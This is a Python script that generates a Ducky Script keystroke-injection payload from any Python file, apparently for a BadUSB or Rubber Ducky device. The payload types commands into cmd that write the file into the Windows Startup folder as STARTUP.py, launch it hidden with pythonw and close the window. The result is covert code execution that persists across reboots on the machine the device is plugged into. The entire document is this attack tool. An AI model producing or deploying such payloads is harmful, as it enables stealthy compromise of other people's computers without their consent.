import os

head = ['DELAY 500','GUI r','DELAY 500','REM Delay for 0.5 seconds before typing','STRING cmd','ENTER','REM Press Enter to open Command Prompt','DELAY 1000','STRING @echo off','ENTER','DELAY 100','STRING cd %APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\','ENTER','DELAY 100\n']
tail = ['\nSTRING start /B pythonw STARTUP.py','ENTER','DELAY 1000','ALT F4']

def create_startup_script(input_file):
    output_lines = []
    with open(input_file, 'r') as file:
        lines = file.readlines()
        for line in lines:
            line = line.rstrip() #Remove whitespace at end
            line = line.replace('\t', '    ') #replace tabs with spaces
            line = line.replace('<', '^<') #add escape characters to < carrot
            line = line.replace('>', '^>') #add escape characters to > carrot
            if line != '':
                output_lines.append(f'STRING echo {line} >> STARTUP.py')
                output_lines.append('ENTER')
                output_lines.append('DELAY 100')
    return output_lines

if __name__ == "__main__":
    input_file = input("Enter the path of the input Python file: ")
    if os.path.exists(input_file):
        output_lines = create_startup_script(input_file)
        with open('output.txt', 'w') as output_file:
            output_file.write('\n'.join(head))
            output_file.write('\n'.join(output_lines))
            output_file.write('\n'.join(tail))
        print("Output file generated successfully as 'output.txt'")
    else:
        print("Input file not found.")